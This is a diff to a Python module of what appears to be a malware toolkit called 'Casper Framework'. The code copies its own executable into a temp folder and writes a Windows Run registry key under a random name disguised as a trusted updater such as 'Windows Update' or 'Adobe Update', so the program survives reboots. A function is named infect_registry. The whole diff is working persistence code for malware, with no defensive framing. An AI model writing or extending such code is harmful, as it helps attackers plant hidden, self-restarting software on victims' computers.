@@ -3,26 +3,35 @@ Part of Casper Framework
 """
 from includes import *
 
-value_names = ["Adobe Update","Microsoft Update","Windows Update","OneDrive Update","Acrobat Reader Plugin","Outlook Plugin","Microsoft Office Update","Google Chrome Update"]
+names = ["Adobe Update","Microsoft Update","Windows Update","OneDrive Update","Acrobat Reader Plugin","Outlook Plugin","Microsoft Office Update","Google Chrome Update"]
 
 def drop():
-	try:
-		shutil.copyfile(os.path.join(os.getcwd(),sys.argv[0]),"c:\\windows\\temp\\"+sys.argv[0])
+	"""
+	Clone myself to temp directory for storage
+	"""
+	if (clone(sys.argv[0]) == True):
 		return True
-	except Exception as e:
+	else:
 		return False
 
 def registry():
+	"""
+	Add registry entry with random name
+	"""
+	HKEY_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+	
 	try:
-		key = r"Software\Microsoft\Windows\CurrentVersion\Run"
-		open = OpenKey(HKEY_CURRENT_USER,key,0,KEY_ALL_ACCESS)
-		SetValueEx(open,random.choice(value_names),0,REG_SZ,"c:\\windows\\temp\\"+sys.argv[0])
+		HKEY_open = OpenKey(HKEY_CURRENT_USER,HKEY_key,0,KEY_ALL_ACCESS)
+		SetValueEx(HKEY_open,random.choice(names),0,REG_SZ,os.path.join(temp_directory(),sys.argv[0]))
 		return True
 	except Exception as e:
 		return False
 
 def infect_registry():
-	logging.debug("[casper] Attempting to add registry key under >> Software\Microsoft\Windows\CurrentVersion\Run")
+	"""
+	Infect the registry
+	"""
+	logging.debug("[casper] Attempting to add registry key under > Software\Microsoft\Windows\CurrentVersion\Run")
 	if (registry() == True):
 		logging.debug("[casper] Registry key was successfully created")
 
